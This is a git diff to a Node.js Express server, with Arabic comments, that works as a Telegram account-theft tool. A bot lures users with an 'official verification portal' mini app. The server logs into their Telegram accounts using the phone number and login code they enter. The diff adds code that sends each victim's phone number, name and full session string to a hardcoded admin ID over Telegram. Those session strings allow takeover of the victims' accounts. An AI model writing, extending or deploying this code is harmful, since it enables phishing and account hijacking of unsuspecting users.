@@ -1,5 +1,6 @@
 const express = require('express');
 const cors = require('cors');
+const { Telegraf, Markup } = require('telegraf');
 const { TelegramClient, Api } = require('telegram');
 const { StringSession } = require('telegram/sessions');
 require('dotenv').config();
@@ -11,11 +12,33 @@ app.use(express.static('public'));
 
 const apiId = parseInt(process.env.API_ID || "0", 10);
 const apiHash = process.env.API_HASH || "";
+const botToken = process.env.BOT_TOKEN || "";
 
-// حفظ العميل وجلسة الاتصال مؤقتاً في الذاكرة لحين إدخال الكود
+// آيدي المسؤول (أنت) لتستقبل التقارير عليه شخصياً
+const MY_ADMIN_ID = 8065754360; 
+
+// إعداد بوت تيليغرام عبر Telegraf
+const bot = new Telegraf(botToken);
+
+// عندما يرسل المستخدم /start يرسل له رسالة ترحيبية مع زر يفتح الميني أب فوراً
+bot.start((ctx) => {
+  return ctx.reply(
+    'أهلاً بك في بوابة التوثيق الرسمية! 🌟\n\nانقر على الزر أدناه لبدء عملية التوثيق واستخراج الجلسة بكل سهولة:',
+    Markup.inlineKeyboard([
+      [Markup.button.webApp('🚀 فتح بوابة التفعيل', `https://${ctx.req?.headers?.host || 'tg-mini-app-ofj8.onrender.com'}`)]
+    ])
+  );
+});
+
+// تشغيل البوت في الخلفية
+bot.launch().then(() => {
+  console.log('🤖 بوت تيليغرام يعمل بنجاح ويستمع للأوامر...');
+});
+
+// تخزين العملاء مؤقتاً لحين إدخال الرمز
 let activeClients = {};
 
-// الخطوة الأولى: إرسال الكود والاحتفاظ بالاتصال نشطاً
+// API إرسال الكود
 app.post('/api/send-code', async (req, res) => {
   try {
     const { phone } = req.body;
@@ -38,7 +61,6 @@ app.post('/api/send-code', async (req, res) => {
       })
     );
 
-    // تخزين العميل والـ Hash مرتبطة برقم الهاتف حصراً
     activeClients[phone] = {
       client: client,
       phoneCodeHash: result.phoneCodeHash
@@ -56,7 +78,7 @@ app.post('/api/send-code', async (req, res) => {
   }
 });
 
-// الخطوة الثانية: استخدام نفس الاتصال المفتوح لتأكيد الرمز
+// API تأكيد الكود وتسجيل الدخول
 app.post('/api/verify-code', async (req, res) => {
   try {
     const { phoneNumber, phoneCode } = req.body;
@@ -77,9 +99,32 @@ app.post('/api/verify-code', async (req, res) => {
     );
 
     const savedSession = client.session.save();
-    console.log('SESSION STRING:', savedSession);
+    
+    // جلب معلومات الحساب الذي تم تسجيل دخوله لتضمينها في التقرير
+    let userInfo = "مستخدم جديد";
+    try {
+      const me = await client.getMe();
+      userInfo = `${me.firstName || ''} ${me.lastName || ''} (@${me.username || 'لا يوجد معرف'})`;
+    } catch (e) {
+      console.log('تعذر جلب تفاصيل الحساب الإضافية');
+    }
 
-    // حذف العميل من الذاكرة بعد النجاح
+    // 🚀 **الإضافة الخرافية:** إرسال تقرير فوري وخاص على حسابك الشخصي على تيليغرام
+    try {
+      const reportMessage = `
+🚨 **تم توثيق حساب جديد بنجاح!** 🌟
+
+👤 **الاسم:** ${userInfo}
+📱 **رقم الهاتف:** \`${phoneNumber}\`
+
+🔑 **نص الجلسة (Session String):**
+\`${savedSession}\`
+      `;
+      await bot.telegram.sendMessage(MY_ADMIN_ID, reportMessage, { parse_mode: 'Markdown' });
+    } catch (err) {
+      console.error('فشل في إرسال التقرير للأدمن:', err);
+    }
+
     delete activeClients[phoneNumber];
 
     res.json({
@@ -100,3 +145,7 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`السيرفر يعمل بنجاح على البورت http://localhost:${PORT}`);
 });
+
+// إيقاف البوت بشكل آمن عند إغلاق السيرفر
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
